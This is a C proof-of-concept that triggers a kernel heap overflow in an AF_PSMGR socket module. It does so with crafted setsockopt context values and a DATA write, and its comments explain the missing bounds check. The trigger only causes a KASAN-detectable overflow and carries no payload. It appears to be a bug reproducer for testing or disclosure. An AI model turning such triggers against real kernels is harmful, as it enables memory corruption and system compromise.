#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <errno.h>
#include <stdint.h>

#define AF_PSMGR        46
#define SOCK_SEQPACKET  5
#define PSMGR_SOL       282
#define PSMGR_OPT_SET_ROLE   1
#define PSMGR_OPT_LOCAL_CTX  4
#define PSMGR_ROLE_MANAGED   0x01
#define PSMGR_XFRM_WINDOW    0x02
#define PSMGR_MODE_LINEAR    0x01
#define PSMGR_MSG_DATA       0x05
/* proc_param=128 -> out_offset=128 = PSMGR_BUF_DATA_SZ, overflows past data[] */
#define TRIGGER_PROC_PARAM   128

struct sockaddr_psmgr {
    uint16_t spsmgr_family;
    uint32_t spsmgr_id;
};

struct psmgr_local_ctx {
    uint8_t  xfrm_type;
    uint8_t  enc_mode;
    uint16_t window_sz;
    uint32_t proc_param;
};

struct psmgr_msghdr {
    uint8_t  msg_type;
    uint8_t  session_id_lo;
    uint16_t payload_len;
    uint32_t seq;
};

int main(void) {
    int fd;
    struct sockaddr_psmgr addr = {0};
    uint8_t role = PSMGR_ROLE_MANAGED;
    struct psmgr_local_ctx ctx = {0};
    struct psmgr_msghdr hdr = {0};
    uint8_t payload[16];
    uint8_t buf[sizeof(hdr) + sizeof(payload)];

    printf("[*] Creating AF_PSMGR socket...\n");
    fd = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    if (fd < 0) { perror("socket"); return 1; }
    printf("[+] Socket fd=%d\n", fd);

    addr.spsmgr_family = AF_PSMGR;
    addr.spsmgr_id = 1;
    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); close(fd); return 1;
    }
    printf("[+] Bound\n");

    if (setsockopt(fd, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, sizeof(role)) < 0) {
        perror("setsockopt ROLE"); close(fd); return 1;
    }
    printf("[+] Role set to MANAGED\n");

    /* WINDOW xfrm + LINEAR mode + proc_param=128 -> out_offset=128
     * MANAGED role skips global PSMGR_BUF_TOTAL_SZ check
     * WINDOW case has no bounds check in switch
     * -> memcpy((u8*)pb + 128, payload, copy_len) overflows psmgr_desc.data[] */
    ctx.xfrm_type  = PSMGR_XFRM_WINDOW;
    ctx.enc_mode   = PSMGR_MODE_LINEAR;
    ctx.window_sz  = 0;
    ctx.proc_param = TRIGGER_PROC_PARAM;
    if (setsockopt(fd, PSMGR_SOL, PSMGR_OPT_LOCAL_CTX, &ctx, sizeof(ctx)) < 0) {
        perror("setsockopt CTX"); close(fd); return 1;
    }
    printf("[+] ctx set: WINDOW/LINEAR/proc_param=%d -> out_offset=%d\n",
           TRIGGER_PROC_PARAM, TRIGGER_PROC_PARAM);

    hdr.msg_type      = PSMGR_MSG_DATA;
    hdr.session_id_lo = 1;
    hdr.payload_len   = sizeof(payload);
    hdr.seq           = 1;
    memset(payload, 0xAA, sizeof(payload));
    memcpy(buf, &hdr, sizeof(hdr));
    memcpy(buf + sizeof(hdr), payload, sizeof(payload));

    printf("[*] Sending DATA msg (triggering overflow at psmgr_core.c:283)...\n");
    if (write(fd, buf, sizeof(buf)) < 0) {
        perror("write"); close(fd); return 1;
    }
    printf("[+] Packet sent - KASAN should fire\n");
    close(fd);
    return 0;
}
